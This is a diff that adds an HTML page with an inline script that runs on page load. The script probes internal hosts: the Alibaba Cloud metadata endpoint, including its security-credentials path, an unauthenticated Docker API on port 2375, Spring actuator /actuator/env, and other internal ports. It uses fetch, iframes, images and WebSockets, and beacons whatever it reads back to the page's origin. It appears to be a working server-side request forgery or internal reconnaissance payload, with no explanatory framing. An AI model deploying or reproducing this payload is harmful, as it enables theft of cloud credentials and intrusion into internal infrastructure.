@@ -1,0 +1,80 @@
+<!DOCTYPE html><html><head><title>TP</title></head><body><div id="o">TIMING</div><script>
+(function(){
+var o=document.getElementById("o"),out=[],t0=performance.now();
+function L(s){out.push(s);try{navigator.sendBeacon("/r/"+encodeURIComponent(s),"");}catch(e){}}
+setTimeout(function(){try{o.innerHTML="<br>"+out.join("<br>");}catch(e){o.innerHTML="DUMPERR";}},5500);
+
+// Alibaba metadata - try with and without headers
+var aliPaths=[
+'/latest/meta-data/','/latest/meta-data/instance-id','/latest/meta-data/hostname',
+'/latest/meta-data/private-ipv4','/latest/meta-data/ram/security-credentials/',
+'/latest/user-data','/latest/dynamic/instance-identity/document'
+];
+aliPaths.forEach(function(p){
+var u='http://100.100.100.200'+p;
+fetch(u,{mode:'no-cors'}).then(function(r){
+L('ALI-NC:'+p+'='+r.type+':'+r.status+':'+Math.round(performance.now()-t0)+'ms');
+}).catch(function(e){L('ALI-NCE:'+p+'='+e.message.slice(0,40)+':'+Math.round(performance.now()-t0)+'ms');});
+fetch(u,{mode:'cors'}).then(function(r){
+L('ALI-C:'+p+'='+r.type+':'+r.status+':'+Math.round(performance.now()-t0)+'ms');
+return r.text().then(function(t){L('ALI-B:'+p+'=len'+t.length+':'+t.slice(0,300));});
+}).catch(function(e){L('ALI-CE:'+p+'='+e.message.slice(0,60)+':'+Math.round(performance.now()-t0)+'ms');});
+});
+
+// Docker 2375 on 10.4.232.131 
+var dockerPaths=['/_ping','/version','/info','/containers/json','/images/json'];
+dockerPaths.forEach(function(p){
+var u='http://10.4.232.131:2375'+p;
+fetch(u,{mode:'no-cors'}).then(function(r){
+L('DOCK-NC:'+p+'='+r.type+':'+r.status+':'+Math.round(performance.now()-t0)+'ms');
+}).catch(function(e){L('DOCK-NCE:'+p+'='+e.message.slice(0,40)+':'+Math.round(performance.now()-t0)+'ms');});
+fetch(u,{mode:'cors'}).then(function(r){
+L('DOCK-C:'+p+'='+r.type+':'+r.status+':'+Math.round(performance.now()-t0)+'ms');
+return r.text().then(function(t){L('DOCK-B:'+p+'=len'+t.length+':'+t.slice(0,300));});
+}).catch(function(e){L('DOCK-CE:'+p+'='+e.message.slice(0,60)+':'+Math.round(performance.now()-t0)+'ms');});
+});
+
+// 10.4.232.131:8080
+['/','/login','/api','/script','/health','/version'].forEach(function(p){
+var u='http://10.4.232.131:8080'+p;
+fetch(u,{mode:'no-cors'}).then(function(r){
+L('8080-NC:'+p+'='+r.type+':'+r.status+':'+Math.round(performance.now()-t0)+'ms');
+}).catch(function(e){L('8080-NCE:'+p+'='+e.message.slice(0,40)+':'+Math.round(performance.now()-t0)+'ms');});
+});
+
+// 10.4.232.131:8081
+['/','/health','/actuator','/actuator/health','/actuator/env'].forEach(function(p){
+var u='http://10.4.232.131:8081'+p;
+fetch(u,{mode:'no-cors'}).then(function(r){
+L('8081-NC:'+p+'='+r.type+':'+r.status+':'+Math.round(performance.now()-t0)+'ms');
+}).catch(function(e){L('8081-NCE:'+p+'='+e.message.slice(0,40)+':'+Math.round(performance.now()-t0)+'ms');});
+});
+
+// Try img/script tags for Docker /_ping (returns "OK" as plain text)
+var img=new Image();img.onload=function(){L('DOCK-IMG:loaded');};img.onerror=function(){L('DOCK-IMG:error:'+Math.round(performance.now()-t0)+'ms');};
+img.src='http://10.4.232.131:2375/_ping?'+Date.now();
+
+// iframe for Alibaba metadata
+var ifr=document.createElement('iframe');ifr.style.display='none';ifr.src='http://100.100.100.200/latest/meta-data/';
+ifr.onload=function(){try{L('ALI-IFR:loaded:'+ifr.contentDocument.body.innerText.slice(0,200));}catch(e){L('ALI-IFR:xorigin:'+e.message.slice(0,60));}};
+document.body.appendChild(ifr);
+
+// Also try WebSocket to Docker
+try{
+var ws=new WebSocket('ws://10.4.232.131:2375/version');
+ws.onopen=function(){L('DOCK-WS:OPEN');ws.send('GET /version HTTP/1.1\r\nHost:localhost\r\n\r\n');};
+ws.onmessage=function(e){L('DOCK-WS:MSG:'+e.data.slice(0,200));};
+ws.onerror=function(){L('DOCK-WS:ERR:'+Math.round(performance.now()-t0)+'ms');};
+ws.onclose=function(e){L('DOCK-WS:CLOSE:'+e.code+':'+Math.round(performance.now()-t0)+'ms');};
+}catch(e){L('DOCK-WS-X:'+e.message.slice(0,40));}
+
+// WebSocket to 38081 (the known internal API)  
+try{
+var ws2=new WebSocket('ws://10.4.232.131:38081/');
+ws2.onopen=function(){L('INT-WS:OPEN');};
+ws2.onerror=function(){L('INT-WS:ERR:'+Math.round(performance.now()-t0)+'ms');};
+ws2.onclose=function(e){L('INT-WS:CLOSE:'+e.code+':'+Math.round(performance.now()-t0)+'ms');};
+}catch(e){L('INT-WS-X:'+e.message.slice(0,40));}
+
+})();
+</script></body></html>
